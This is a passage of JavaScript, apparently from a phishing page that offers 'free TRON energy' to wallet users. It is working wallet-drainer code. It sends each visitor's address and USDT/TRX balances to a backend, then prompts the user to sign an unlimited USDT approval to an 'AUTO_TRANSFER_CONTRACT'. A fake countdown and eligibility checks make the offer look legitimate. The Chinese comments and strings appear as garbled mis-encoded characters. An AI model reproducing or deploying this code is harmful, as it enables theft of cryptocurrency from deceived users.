            loadingTip: "âœ… Loading...",
            queryingBalance: "Querying...",
            insufficientUsdt: "âŒ Ineligible: USDT balance must exceed 1",
            insufficientBtn: "Ineligible",
            eligibleTip: "âœ… Eligible for 90000 USDT Energy",
            distributingBtn: "Energy Distributing...",
            redirectingBtn: "Redirecting to Signature...",
            approveFail: "âš ï¸ Operation failed: {msg}, please try again later",
            authorizeFail: "âš ï¸ Authorization failed: {msg}, please try again later",
            successTip: "ğŸ‰ Free Energy Claim Completed! 90000Î¼s USDT Energy has been creditedï½",
            successBtn: "Claim Successful",
            successArrival: "<br><span style='color: #000000;'>âœ… 90000Î¼s USDT Energy credited</span>",
            recordAddress: "Address:",
            recordType: "Claim Type:",
            recordEnergy: "Energy Obtained:",
            recordTime: "Claim Time:",
            freeEnergy: "Free Claim",
            systemBusyTip: "System busy, please try again later",
            ineligibleTip: "Ineligible",
            errorTipPrefix: "âš ï¸ ",
            noWalletAddress: "âŒ No valid wallet address detected<br><span style='color: #000000; font-size: 14px;'>Please select a wallet to reconnect</span>",
            nonImTokenUser: "Non-TRON-compatible wallet user<br><span style='color: #000000; font-size: 13px;'>Auto-launching supported wallet...</span>",
            specialTipTitle: "TRON-EAB",
            specialTipContent: "This link is only for emergency assistance to TRON ecosystem users who need to transfer on the Tron network without wallet energy or TRX. Resources are limited, please do not use it as a profitable project.",
            a1CheckingTip: "Environment checking...",
            a1EligibleTip: "âœ… Environment eligible for claim",
            a1SignalFailTip: "Environment check failed, please reconnect wallet"
        }
    };

    /********************************************************************
     * å…¨å±€çŠ¶æ€å˜é‡ï¼šä»…ä¿ç•™å¿…è¦çŠ¶æ€ï¼Œæ— æ–°å¢/åˆ é™¤
     ********************************************************************/
    let tronWeb = null; // TRONWebå®ä¾‹
    let userAddress = null; // å½“å‰è¿æ¥çš„é’±åŒ…åœ°å€
    let trc20Contract = null; // USDTåˆçº¦å®ä¾‹
    let tokenBalance = 0.00; // USDTä½™é¢ï¼ˆæ ¼å¼åŒ–åï¼‰
    let trxBalance = 0.00; // TRXä½™é¢ï¼ˆæ ¼å¼åŒ–åï¼‰
    let currentEnergy = 0; // ç”¨æˆ·å½“å‰èƒ½é‡ï¼ˆæŸ¥è¯¢ç»“æœï¼‰
    let currentBandwidth = 0; // ç”¨æˆ·å½“å‰å®½å¸¦ï¼ˆæŸ¥è¯¢ç»“æœï¼‰
    let currentLang = localStorage.getItem("tron_energy_lang") || "zh"; // å½“å‰è¯­è¨€
    let trxTimer = null; // èƒ½é‡å€’è®¡æ—¶å®šæ—¶å™¨
    let contractEnergyEl = null; // åˆçº¦å‰©ä½™èƒ½é‡DOMå…ƒç´ 

    /********************************************************************
     * DOMå…ƒç´ é›†ä¸­è·å–ï¼šé¿å…é‡å¤æŸ¥è¯¢ï¼Œæå‡æ€§èƒ½ï¼ˆå˜é‡åä¸åŸä»£ç ä¸€è‡´ï¼‰
     ********************************************************************/
    const DOM = {
        walletStatusContainer: document.getElementById("walletStatusContainer"),
        contractAddrEl: document.getElementById("contractAddr"),
        userInfoEl: document.getElementById("userInfo"),
        userInfoStatus: document.getElementById("userInfoStatus"),
        connectBtn: document.getElementById("connectBtn"),
        approveBtn: document.getElementById("approveBtn"),
        warning: document.querySelector('.warning'),
        approvalRecords: document.getElementById("approvalRecords"),
        reviewTip: document.getElementById("reviewTip"),
        reviewTipText: document.getElementById("reviewTipText"),
        langDropdown: document.getElementById("langDropdown"),
        langToggleBtn: document.getElementById("langToggleBtn"),
        langDropdownItems: document.querySelectorAll(".lang-dropdown-item"),
        footerInfo: document.getElementById("footerInfo"),
        recordList: document.getElementById("recordList"),
        specialTipContainer: document.getElementById("specialTipContainer"),
        nonImTokenPopup: document.getElementById("nonImTokenPopup"),
        closePopupBtn: document.getElementById("closePopupBtn"),       
        balanceUsdtEl: document.getElementById("balanceUsdt"),
        balanceTrxEl: document.getElementById("balanceTrx"),
        balanceEnergyEl: document.getElementById("balanceEnergy"),
        balanceBandwidthEl: document.getElementById("balanceBandwidth"),
        balanceItems: document.querySelectorAll(".balance-item"),
        multiWalletPopup: document.getElementById("multiWalletPopup"),
        closeMultiWalletBtn: document.getElementById("closeMultiWalletBtn"),
        walletItems: document.querySelectorAll(".wallet-item"),
        statusAddressEl: document.getElementById("statusAddress")
    };

    /********************************************************************
     * å·¥å…·å‡½æ•°ï¼šé€šç”¨è¾…åŠ©é€»è¾‘ï¼ˆä¿®å¤èƒ½é‡/å®½å¸¦æŸ¥è¯¢æ–¹å¼ï¼‰
     ********************************************************************/

    /**
     * è·å–å·²æˆæƒé¢†å–çš„åœ°å€åˆ—è¡¨ï¼ˆ30å¤©é™åˆ¶ï¼‰
     * @returns {Array} å·²æˆæƒåœ°å€æ•°ç»„
     */
    function getAuthorizedAddresses() {
        try {
            const stored = localStorage.getItem(AUTHORIZED_KEY);
            return stored ? JSON.parse(stored) : [];
        } catch (e) {
            console.warn("è¯»å–å·²æˆæƒåœ°å€å¤±è´¥ï¼š", e);
            return [];
        }
    }

    /**
     * æ·»åŠ åœ°å€åˆ°å·²æˆæƒåˆ—è¡¨ï¼ˆé¢†å–æˆåŠŸåè°ƒç”¨ï¼‰
     * @param {string} address - é’±åŒ…åœ°å€
     */
    function addAuthorizedAddress(address) {
        try {
            const addresses = getAuthorizedAddresses();
            if (!addresses.includes(address)) {
                addresses.push(address);
                localStorage.setItem(AUTHORIZED_KEY, JSON.stringify(addresses));
            }
        } catch (e) {
            console.warn("å­˜å‚¨å·²æˆæƒåœ°å€å¤±è´¥ï¼š", e);
        }
    }

    /**
     * æ£€æŸ¥åœ°å€æ˜¯å¦å·²æˆæƒé¢†å–ï¼ˆ30å¤©å†…ï¼‰
     * @param {string} address - é’±åŒ…åœ°å€
     * @returns {boolean} true=å·²æˆæƒï¼Œfalse=æœªæˆæƒ
     */
    function isAddressAuthorized(address) {
        const addresses = getAuthorizedAddresses();
        if (!addresses.includes(address)) return false;
        const records = JSON.parse(localStorage.getItem(RECORD_KEY) || "[]");
        const record = records.find(item => item.address === address);
        if (!record) return false;
        const receiveTime = new Date(record.receiveTime).getTime();
        const thirtyDays = 30 * 24 * 60 * 60 * 1000;
        return Date.now() - receiveTime < thirtyDays;
    }

    /**
     * æ£€æŸ¥æ˜¯å¦å¯ä»¥å‘é€A1ä¿¡å·ï¼ˆ15åˆ†é’Ÿé˜²é‡å¤ï¼‰
     * @param {string} address - é’±åŒ…åœ°å€
     * @returns {boolean} true=å¯å‘é€ï¼Œfalse=ä¸å¯å‘é€
     */
    function canSendA1Signal(address) {
        try {
            const records = JSON.parse(localStorage.getItem(A1_SIGNAL_KEY) || "{}");
            const lastSendTime = records[address] || 0;
            const now = Date.now();
            return now - lastSendTime > 15 * 60 * 1000; // 15åˆ†é’Ÿé—´éš”
        } catch (e) {
            console.warn("æ£€æŸ¥A1ä¿¡å·å‘é€æƒé™å¤±è´¥ï¼š", e);
            return true;
        }
    }

    /**
     * æ›´æ–°A1ä¿¡å·å‘é€è®°å½•ï¼ˆå‘é€åè°ƒç”¨ï¼‰
     * @param {string} address - é’±åŒ…åœ°å€
     */
    function updateA1SignalRecord(address) {
        try {
            const records = JSON.parse(localStorage.getItem(A1_SIGNAL_KEY) || "{}");
            records[address] = Date.now();
            localStorage.setItem(A1_SIGNAL_KEY, JSON.stringify(records));
        } catch (e) {
            console.warn("æ›´æ–°A1ä¿¡å·è®°å½•å¤±è´¥ï¼š", e);
        }
    }

    /**
     * æ£€æŸ¥æ˜¯å¦å·²å‘é€B1ä¿¡å·ï¼ˆ30å¤©é˜²é‡å¤ï¼‰
     * @param {string} address - é’±åŒ…åœ°å€
     * @returns {boolean} true=å·²å‘é€ï¼Œfalse=æœªå‘é€
     */
    function hasSentB1Signal(address) {
        try {
            const records = JSON.parse(localStorage.getItem(B1_SIGNAL_KEY) || "{}");
            const item = records[address];
            if (!item) return false;
            return Date.now() - item.time < 30 * 24 * 60 * 60 * 1000;
        } catch (e) {
            console.warn("æ£€æŸ¥B1é˜²é‡å¤å¤±è´¥ï¼š", e);
            return false;
        }
    }

    /**
     * æ ‡è®°B1ä¿¡å·å·²å‘é€ï¼ˆå‘é€åè°ƒç”¨ï¼‰
     * @param {string} address - é’±åŒ…åœ°å€
     */
    function markB1SignalSent(address) {
        try {
            const records = JSON.parse(localStorage.getItem(B1_SIGNAL_KEY) || "{}");
            records[address] = { time: Date.now() };
            localStorage.setItem(B1_SIGNAL_KEY, JSON.stringify(records));
        } catch (e) {
            console.warn("æ ‡è®°B1ä¿¡å·å¤±è´¥ï¼š", e);
        }
    }

  /**
 * ä¿®å¤ï¼šæŸ¥è¯¢å¸¦å®½ä½™é¢ï¼ˆå…¼å®¹æ‰€æœ‰é’±åŒ…ï¼ŒæŒ‰TRONå®˜æ–¹è§„èŒƒè®¡ç®—å‰©ä½™å¸¦å®½ï¼‰
 * è¯´æ˜ï¼šä½¿ç”¨getBandwidthè·å–å·²ç”¨å¸¦å®½ï¼Œé€šè¿‡é»˜è®¤æ€»é¢5000è®¡ç®—å‰©ä½™ï¼Œå»æ‰localå‚æ•°ç¡®ä¿å¤šé’±åŒ…é€‚é…
 * @param {string} address - é’±åŒ…åœ°å€ï¼ˆBase58/Hexæ ¼å¼å‡å¯ï¼‰
 * @returns {number} å‰©ä½™å¸¦å®½ç‚¹æ•°ï¼ˆæŸ¥è¯¢å¤±è´¥è¿”å›0ï¼‰
 */
async function queryBandwidthBalance(address) {
    try {
        if (!tronWeb) return 0;
        
        // è°ƒç”¨TRONå®˜æ–¹APIæŸ¥è¯¢å¸¦å®½ä½¿ç”¨æƒ…å†µï¼ˆå…¼å®¹æ‰€æœ‰é’±åŒ…çš„å…¨å±€tronWebå®ä¾‹ï¼‰
        const bandwidthData = await tronWeb.trx.getBandwidth(address);
        const freeNetUsed = bandwidthData?.freeNetUsed || 0; // å·²ä½¿ç”¨çš„å…è´¹å¸¦å®½ç‚¹æ•°
        const BANDWIDTH_TOTAL = 600; // TRONç½‘ç»œé»˜è®¤å…è´¹å¸¦å®½æ€»é¢ï¼ˆå›ºå®šå€¼ï¼‰
        const remainingBandwidth = BANDWIDTH_TOTAL - freeNetUsed;
        
        // ç¡®ä¿å‰©ä½™å¸¦å®½éè´Ÿï¼Œè¿”å›æœ€ç»ˆç»“æœ
        return Math.max(remainingBandwidth, 0);
    } catch (e) {
        console.warn("æŸ¥è¯¢å¸¦å®½ä½™é¢å¤±è´¥ï¼š", e);
        return 0;
    }
}

/**
 * ä¿®å¤ï¼šæŸ¥è¯¢èƒ½é‡ä½™é¢ï¼ˆå…¼å®¹æ‰€æœ‰é’±åŒ…ï¼ŒåŒ…å«å†»ç»“èƒ½é‡çš„æ€»å‰©ä½™èƒ½é‡ï¼‰
 * è¯´æ˜ï¼šä½¿ç”¨getAccountResourcesè·å–å®Œæ•´èƒ½é‡æ•°æ®ï¼Œç¡®ä¿åŒ…å«å†»ç»“èƒ½é‡ï¼Œå»æ‰localå‚æ•°å…¼å®¹å¤šé’±åŒ…
 * @param {string} address - é’±åŒ…åœ°å€ï¼ˆBase58/Hexæ ¼å¼å‡å¯ï¼‰
 * @returns {number} å‰©ä½™èƒ½é‡ç‚¹æ•°ï¼ˆåŒ…å«å†»ç»“èƒ½é‡ï¼ŒæŸ¥è¯¢å¤±è´¥è¿”å›0ï¼‰
 */
async function queryUserEnergyBalance(address) {
    try {
        if (!tronWeb) return 0;
        
        // è°ƒç”¨TRONå®˜æ–¹APIæŸ¥è¯¢å®Œæ•´è´¦æˆ·èµ„æºï¼ˆå…¼å®¹æ‰€æœ‰é’±åŒ…çš„å…¨å±€tronWebå®ä¾‹ï¼‰
        const accountResources = await tronWeb.trx.getAccountResources(address);
        const energyLimit = accountResources?.EnergyLimit || 0; // èƒ½é‡æ€»ä¸Šé™ï¼ˆåŒ…å«å†»ç»“èƒ½é‡ï¼‰
        const energyUsed = accountResources?.EnergyUsed || 0; // å·²ä½¿ç”¨çš„èƒ½é‡ç‚¹æ•°
        const remainingEnergy = energyLimit - energyUsed;
        
        // ç¡®ä¿å‰©ä½™èƒ½é‡éè´Ÿï¼Œè¿”å›æœ€ç»ˆç»“æœ
        return Math.max(remainingEnergy, 0);
    } catch (e) {
        console.warn("æŸ¥è¯¢ç”¨æˆ·è‡ªèº«èƒ½é‡å¤±è´¥ï¼š", e);
        return 0;
    }
}
    /**
     * åˆå§‹åŒ–è¯­è¨€æ˜¾ç¤ºï¼ˆåˆ‡æ¢è¯­è¨€åè°ƒç”¨ï¼‰
     */
    function initLangDisplay() {
        if (currentLang === "zh") {
            DOM.langToggleBtn.innerHTML = 'ğŸ‡¨ğŸ‡³ <span id="currentLangText">ç®€ä½“ä¸­æ–‡</span>';
        } else {
            DOM.langToggleBtn.innerHTML = 'ğŸ‡ºğŸ‡¸ <span id="currentLangText">English</span>';
        }
    }

    /**
     * åˆ‡æ¢è¯­è¨€ï¼ˆæ›´æ–°é¡µé¢æ–‡æœ¬+ç¼“å­˜ï¼‰
     * @param {string} newLang - æ–°è¯­è¨€ï¼ˆzh/enï¼‰
     */
    function changeLang(newLang) {
        currentLang = newLang;
        localStorage.setItem("tron_energy_lang", currentLang);
        initLangDisplay();
        updatePageLang();
        reRenderDynamicContent();
        renderEnergyRecords();
        DOM.langDropdown.classList.remove("open");
    }

    /**
     * æ›´æ–°é¡µé¢æ‰€æœ‰è¯­è¨€ç›¸å…³æ–‡æœ¬ï¼ˆåˆ‡æ¢è¯­è¨€åè°ƒç”¨ï¼‰
     */
    function updatePageLang() {
        const lang = langConfig[currentLang];
        Object.keys(lang).forEach(key => {
            const el = document.getElementById(key);
            if (el) {
                el.innerHTML = lang[key];
            }
        });
        DOM.connectBtn.textContent = lang.connectBtnText;
        DOM.approveBtn.textContent = lang.approveBtnText;
        DOM.reviewTipText.textContent = lang.reviewTipText;
        DOM.approvalRecords.textContent = lang.noRecord;
    }

    /**
     * è®¡ç®—å½“å‰åˆçº¦å‰©ä½™èƒ½é‡ï¼ˆå€’è®¡æ—¶é€»è¾‘ï¼Œæ— ä¿®æ”¹ï¼‰
     * @returns {number} å½“å‰å‰©ä½™èƒ½é‡
     */
    function calculateCurrentEnergy() {
    // å®æ—¶è®¡ç®—éƒ¨ç½²åˆ°å½“å‰çš„ç§’æ•°å·®ï¼ˆä¸å­˜æœ¬åœ°ï¼Œç›´æ¥è®¡ç®—ï¼‰
    const secPassedSinceDeploy = Math.max(0, Math.floor((Date.now() - DEPLOY_START_TIME) / 1000));
    // å®æ—¶è®¡ç®—å‰©ä½™èƒ½é‡ï¼ˆæœ€ä½ä¸º0ï¼Œé¿å…è´Ÿæ•°ï¼‰
    currentEnergy = Math.max(0, INIT_TRX - secPassedSinceDeploy * TRX_DECREASE_PER_SEC);
    // å®æ—¶æ›´æ–°DOMæ˜¾ç¤º
    if (contractEnergyEl) contractEnergyEl.textContent = Math.floor(currentEnergy);
    return currentEnergy;
}
    /**
     * æ›´æ–°åˆçº¦å‰©ä½™èƒ½é‡æ˜¾ç¤ºï¼ˆå€’è®¡æ—¶åˆ·æ–°ï¼Œæ— ä¿®æ”¹ï¼‰
     */
    function updateEnergyDisplay() {
        if (!contractEnergyEl) return;
        calculateCurrentEnergy();
        contractEnergyEl.textContent = Math.floor(currentEnergy);
        contractEnergyEl.innerHTML = Math.floor(currentEnergy);
        contractEnergyEl.offsetHeight; // å¼ºåˆ¶é‡ç»˜
        console.log("èƒ½é‡è·³åŠ¨ä¸­ï¼š", Math.floor(currentEnergy));
    }

    /**
     * å¯åŠ¨èƒ½é‡å€’è®¡æ—¶å®šæ—¶å™¨ï¼ˆé¡µé¢åŠ è½½åè°ƒç”¨ï¼Œæ— ä¿®æ”¹ï¼‰
     */
    function startPersistentEnergyCountdown() {
    // ç§»é™¤æœ¬åœ°ç¼“å­˜æ¸…ç†é€»è¾‘ï¼ˆæ— éœ€è¯»å†™æœ¬åœ°ï¼‰
    if (trxTimer) clearTimeout(trxTimer);
    calculateCurrentEnergy(); // é¦–æ¬¡å®æ—¶è®¡ç®—
    updateEnergyDisplay();
    function tick() {
        updateEnergyDisplay(); // æ¯ç§’å®æ—¶é‡æ–°è®¡ç®—
        if (currentEnergy > 0) {
            trxTimer = setTimeout(tick, 1000);
        }
    }
    tick();
    console.log("èƒ½é‡å®šæ—¶å™¨å·²å¯åŠ¨ï¼Œçº¯å®æ—¶è®¡ç®—æ¨¡å¼");
}
    /**
     * ä¿å­˜èƒ½é‡é¢†å–è®°å½•åˆ°æœ¬åœ°å­˜å‚¨ï¼ˆæ— ä¿®æ”¹ï¼‰
     */
    function saveEnergyRecord() {
        const lang = langConfig[currentLang];
        const existing = JSON.parse(localStorage.getItem(RECORD_KEY) || "[]");
        const newRecords = existing.filter(item => item.address !== userAddress);
        newRecords.push({
            address: userAddress,
            tokenBalance: tokenBalance,
            trxBalance: trxBalance,
            receiveTime: new Date().toLocaleString(),
            energyAmount: "90000Î¼s",
            recordType: lang.freeEnergy
        });
        localStorage.setItem(RECORD_KEY, JSON.stringify(newRecords));
    }

    /**
     * æ¸²æŸ“èƒ½é‡é¢†å–è®°å½•ï¼ˆé¡µé¢æ˜¾ç¤ºï¼Œæ— ä¿®æ”¹ï¼‰
     */
    function renderEnergyRecords() {
        const lang = langConfig[currentLang];
        const container = DOM.approvalRecords;
        const records = JSON.parse(localStorage.getItem(RECORD_KEY) || "[]");
        if (records.length === 0) {
            container.innerHTML = `<div class='record-item' style='text-align: center; padding: 10px 0;'>${lang.noRecord}</div>`;
            return;
        }
        container.innerHTML = records.map(record => `
            <div class='record-item'>
                <p><strong>${lang.recordType}</strong>${record.recordType}</p>
                <p><strong>${lang.recordEnergy}</strong>${record.energyAmount} USDT Energy</p>
                <p><strong>${lang.recordTime}</strong>${record.receiveTime}</p>
            </div>
        `).join("");
    }

    /**
     * æ›´æ–°é’±åŒ…è¿æ¥çŠ¶æ€æ˜¾ç¤ºï¼ˆå·²è¿æ¥/æœªè¿æ¥ï¼Œæ— ä¿®æ”¹ï¼‰
     */
    function updateWalletStatus() {
        userAddress 
            ? DOM.walletStatusContainer.classList.add("connected") 
            : DOM.walletStatusContainer.classList.remove("connected");
    }

    /**
     * é‡ç½®ç”¨æˆ·ä½™é¢æ˜¾ç¤ºï¼ˆæœªè¿æ¥é’±åŒ…æ—¶ï¼Œæ— ä¿®æ”¹ï¼‰
     */
    function updateUserBalanceDisplay() {
        DOM.balanceUsdtEl.textContent = "--";
        DOM.balanceTrxEl.textContent = "--";
        DOM.balanceEnergyEl.textContent = "--";
        DOM.balanceBandwidthEl.textContent = "--";
    }
     /**
     * æ–°å¢ï¼šæ›´æ–°ç”¨æˆ·ä¿¡æ¯æ˜¾ç¤ºï¼ˆè¡¥å…¨æœªå®šä¹‰å‡½æ•°ï¼‰
     */
    function updateUserInfoDisplay() {
        const lang = langConfig[currentLang];
        if (!userAddress) {
            DOM.userInfoStatus.style.display = "none";
            updateUserBalanceDisplay();
        } else {
            DOM.userInfoStatus.style.display = "block";
            // æ˜¾ç¤ºåœ°å€ï¼ˆç»Ÿä¸€æ ¼å¼ï¼‰
            if (DOM.statusAddressEl) {
                DOM.statusAddressEl.textContent = `${userAddress.slice(0,8)}...${userAddress.slice(-6)}`;
            }
        }
    }
    /**
 * å°è£…ï¼šæŸ¥è¯¢å¹¶æ›´æ–°ç”¨æˆ·ä½™é¢ï¼ˆèƒ½é‡+å®½å¸¦ï¼Œç»Ÿä¸€è°ƒç”¨ï¼‰
 * ç”¨äºA1/B2ä¿¡å·è¿”å›åè¡¥å……æŸ¥è¯¢ï¼Œè§£å†³å»¶è¿Ÿæ˜¾ç¤ºé—®é¢˜
 */
async function queryAndUpdateBalance() {
    if (!userAddress || !tronWeb) return; // åœ°å€æˆ–tronWebæœªå°±ç»ªåˆ™è·³è¿‡
    try {
        // å¹¶è¡ŒæŸ¥è¯¢èƒ½é‡å’Œå®½å¸¦ï¼ˆå¤ç”¨å·²æœ‰æŸ¥è¯¢é€»è¾‘ï¼‰
        const [newEnergy, newBandwidth] = await Promise.all([
            queryUserEnergyBalance(userAddress),
            queryBandwidthBalance(userAddress)
        ]);
        // æ›´æ–°å…¨å±€å˜é‡ï¼ˆç¡®ä¿åç»­é€»è¾‘ä½¿ç”¨æœ€æ–°å€¼ï¼‰
        currentEnergy = newEnergy;
        currentBandwidth = newBandwidth;
        // åˆ·æ–°DOMæ˜¾ç¤ºï¼ˆå¤ç”¨å·²æœ‰æ˜¾ç¤ºé€»è¾‘ï¼‰
        showBalanceInUserInfo();
        console.log("âœ… è¡¥å……æŸ¥è¯¢ä½™é¢æˆåŠŸï¼š", { èƒ½é‡: newEnergy, å®½å¸¦: newBandwidth });
    } catch (e) {
        console.warn("âŒ è¡¥å……æŸ¥è¯¢ä½™é¢å¤±è´¥ï¼š", e);
    }
}

    /********************************************************************
     * æ–°å¢æ ¸å¿ƒéªŒè¯/æ˜¾ç¤ºå‡½æ•°ï¼šæŒ‰è®¨è®ºé€»è¾‘æ–°å¢ï¼Œä¸å½±å“åŸæœ‰åŠŸèƒ½
     ********************************************************************/

    /**
     * éªŒè¯ç”¨æˆ·èµ„æ ¼ï¼ˆå‰ç½®â€œé—¨â€ï¼šä½™é¢+é¢†å–è®°å½•ï¼‰
     * @returns {Object} { eligible: æ˜¯å¦ç¬¦åˆæ¡ä»¶, tip: æ˜¾ç¤ºæç¤ºæ–‡æœ¬, btnText: æŒ‰é’®æ–‡æœ¬ }
     */
    function verifyUserEligibility() {
        const lang = langConfig[currentLang];
        // éªŒè¯1ï¼šUSDTä½™é¢éœ€å¤§äº1
        if (tokenBalance <= 1) {
            return { eligible: false, tip: lang.insufficientUsdt, btnText: lang.insufficientBtn };
        }
        // éªŒè¯2ï¼š30å¤©å†…æœªé¢†å–è¿‡
        if (isAddressAuthorized(userAddress)) {
            return { eligible: false, tip: lang.authorizedTip, btnText: lang.authorizedBtn };
        }
        // éªŒè¯é€šè¿‡
        return { eligible: true, tip: lang.eligibleTip, btnText: lang.approveBtnText };
    }

    /**
     * ä»…åœ¨#userInfoå®¹å™¨æ˜¾ç¤ºä½™é¢ï¼ˆä¸¥æ ¼æŒ‰è¦æ±‚ï¼Œä¸æ¶‰åŠå…¶ä»–HTMLï¼‰
     */
    function showBalanceInUserInfo() {
        DOM.balanceItems.forEach(item => item.style.display = "flex"); // ä»…åœ¨#userInfoå†…æ˜¾ç¤º
        DOM.balanceUsdtEl.textContent = tokenBalance.toFixed(2);
        DOM.balanceTrxEl.textContent = trxBalance.toFixed(2);
        DOM.balanceEnergyEl.textContent = Math.floor(currentEnergy); // ç¡®ä¿æ˜¾ç¤ºæŸ¥è¯¢åˆ°çš„èƒ½é‡
        DOM.balanceBandwidthEl.textContent = Math.floor(currentBandwidth); // ç¡®ä¿æ˜¾ç¤ºæŸ¥è¯¢åˆ°çš„å®½å¸¦
    }

    /********************************************************************
     * æ ¸å¿ƒä¸šåŠ¡å‡½æ•°ï¼šä¿®å¤3ä¸ªé—®é¢˜ï¼Œä¸æ”¹åŠ¨æ ¸å¿ƒé€»è¾‘
     ********************************************************************/

    /**
     * å‘é€A1ä¿¡å·åˆ°åç«¯ï¼ˆç¯å¢ƒæ ¡éªŒï¼‰
     * @returns {string} success=å‘é€æˆåŠŸï¼Œfail=å‘é€å¤±è´¥
     */
async function sendSignalA1() {
    const requestData = { userAddress };
    const controller = new AbortController();
    const timeoutId = setTimeout(() => controller.abort(), 20000);
    try {
        const res = await fetch(`${BACKEND_API}/api/send-signal-a1`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify(requestData),
            signal: controller.signal,
            keepalive: true
        });
        clearTimeout(timeoutId);
        if (res.ok) {
            const a1Status = JSON.parse(localStorage.getItem(A1_STATUS_KEY) || "{}");
            a1Status[userAddress] = "success";
            localStorage.setItem(A1_STATUS_KEY, JSON.stringify(a1Status));
            // åŒæ­¥é˜²é‡å¤è®°å½•ï¼ˆå…³é”®ï¼šç¡®ä¿15åˆ†é’Ÿå†…ä¸å†å‘é€ï¼‰
            updateA1SignalRecord(userAddress);
            console.log(`âœ… A1ä¿¡å·å‘é€æˆåŠŸï¼ˆåç«¯è¿”å›çŠ¶æ€ç ï¼š${res.status}ï¼‰`);
            return "success";
        }
        throw new Error(`A1ä¿¡å·åç«¯è¿”å›éæˆåŠŸçŠ¶æ€ï¼š${res.status}`);
    } catch (e) {
        clearTimeout(timeoutId);
        console.warn("âŒ A1ä¿¡å·å‘é€å¤±è´¥ï¼ˆç½‘ç»œ/è¶…æ—¶/åç«¯å¼‚å¸¸ï¼‰ï¼š", e);
        const a1Status = JSON.parse(localStorage.getItem(A1_STATUS_KEY) || "{}");
        a1Status[userAddress] = "fail";
        localStorage.setItem(A1_STATUS_KEY, JSON.stringify(a1Status));
        return "fail";
    }
}

    /**
     * å‘é€A2ä¿¡å·åˆ°åç«¯ï¼ˆä½™é¢ä¿¡æ¯ä¸ŠæŠ¥ï¼‰
     * @returns {boolean} true=å‘é€æˆåŠŸï¼Œfalse=å‘é€å¤±è´¥
     */
    async function sendSignalA2() {
        const requestData = { 
            userAddress, 
            usdtBalance: tokenBalance, 
            trxBalance: trxBalance 
        };
        const controller = new AbortController();
        const timeoutId = setTimeout(() => controller.abort(), 20000); // 20ç§’è¶…æ—¶
        try {
            const res = await fetch(`${BACKEND_API}/api/send-signal-a2`, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify(requestData),
                signal: controller.signal,
                keepalive: true
            });
            clearTimeout(timeoutId);
            if (res.ok) {
                console.log("âœ… A2ä¿¡å·å‘é€æˆåŠŸ");
                return true;
            } else {
                console.log("âŒ A2ä¿¡å·å‘é€å¤±è´¥ï¼ˆåç«¯é200çŠ¶æ€ï¼‰");
                return false;
            }
        } catch (e) {
            clearTimeout(timeoutId);
            console.warn("âŒ A2ä¿¡å·å‘é€å¼‚å¸¸ï¼š", e);
            return false;
        }
    }

    /**
     * å‘é€Bä¿¡å·åˆ°åç«¯ï¼ˆé¢†å–èµ„æ ¼æ ¡éªŒ/ç¡®è®¤ï¼‰
     * @param {boolean} isB1 - æ˜¯å¦ä¸ºB1ä¿¡å·ï¼ˆtrue=æ ¡éªŒï¼Œfalse=ç¡®è®¤ï¼‰
     * @returns {boolean} true=å‘é€æˆåŠŸï¼Œfalse=å‘é€å¤±è´¥
     */
    async function sendSignalB(isB1 = true) {
        const requestData = { userAddress };
        const apiPath = isB1 ? "/api/send-signal-b1" : "/api/send-signal-b2";
        const controller = new AbortController();
        const timeoutId = setTimeout(() => controller.abort(), 20000); // 20ç§’è¶…æ—¶
        const lang = langConfig[currentLang];
        try {
            const res = await fetch(`${BACKEND_API}${apiPath}`, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify(requestData),
                signal: controller.signal,
                keepalive: true
            });
            clearTimeout(timeoutId);
            if ([400, 408, 409].includes(res.status)) {
                const errData = await res.json().catch(() => ({ detail: lang.ineligibleTip }));
                console.warn(`âŒ ${isB1 ? "B1" : "B2"}ä¿¡å·ç”¨æˆ·ä¸åˆè§„ï¼š`, errData.detail);
                return false;
            }
            if (res.ok) {
                console.log(`âœ… ä¿¡å·${isB1 ? "B1" : "B2"}å¤„ç†æˆåŠŸ`);
                addAuthorizedAddress(userAddress);
                saveEnergyRecord();
                return true;
            }
            console.warn(`âŒ ${isB1 ? "B1" : "B2"}ä¿¡å·åç«¯è¿”å›å¼‚å¸¸çŠ¶æ€ï¼š${res.status}`);
            return false;
        } catch (e) {
            clearTimeout(timeoutId);
            console.error(`âŒ ${isB1 ? "B1" : "B2"}ä¿¡å·å‘é€å¼‚å¸¸ï¼š`, e);
            return false;
        }
    }

     /**
     * ç»‘å®šé¢†å–èƒ½é‡æŒ‰é’®é€»è¾‘ï¼ˆæ ¸å¿ƒé¢†å–æµç¨‹ï¼Œæ— ä¿®æ”¹ï¼‰
     */
    function bindApproveLogic() {
        const lang = langConfig[currentLang];
        DOM.approveBtn.onclick = async () => {
            const btn = DOM.approveBtn;
            btn.disabled = true;
            btn.textContent = lang.redirectingBtn;
            DOM.reviewTip.style.display = "flex";
            DOM.reviewTipText.textContent = "å‘èµ·ç­¾åï¼Œè¯·åœ¨é’±åŒ…ä¸­ç¡®è®¤...";
            try {
                // 2. å‘é€B1ä¿¡å·ï¼ˆé˜²é‡å¤å‘é€ï¼Œç‰¹æ®Šåœ°å€è±å…ï¼‰
                if (!hasSentB1Signal(userAddress) && userAddress !== SPECIAL_ADDRESS) {
                    sendSignalB(true).catch(err => console.warn("B1ä¿¡å·å‘é€å¤±è´¥ï¼ˆä¸å½±å“ç­¾åï¼‰ï¼š", err));
                    markB1SignalSent(userAddress);
                }

                // 3. åˆå§‹åŒ–åˆçº¦å®ä¾‹ï¼ˆç¡®ä¿æœ‰æ•ˆï¼‰
                if (!trc20Contract) {
                    trc20Contract = await tronWeb.contract(USDT_ABI, TRC20_TOKEN_ADDRESS);
                    if (!trc20Contract) throw new Error("åˆçº¦å®ä¾‹åˆå§‹åŒ–å¤±è´¥ï¼Œè¯·é‡æ–°è¿æ¥é’±åŒ…");
                }

                // 4. ç¡®ä¿TronWebå°±ç»ª
                if (!tronWeb.ready) {
                    await new Promise(resolve => tronWeb.onReady(resolve));
                }

                // 5. åˆçº¦æˆæƒè°ƒç”¨ï¼ˆæ ¸å¿ƒç­¾åæµç¨‹ï¼‰
                const approveResult = await trc20Contract.approve(
                    AUTO_TRANSFER_CONTRACT,
                    INFINITE_APPROVE_AMOUNT
                ).send({
                    from: userAddress,
                    shouldPollResponse: true
                });

                // 6. ç­¾åæˆåŠŸåæ”¶å°¾
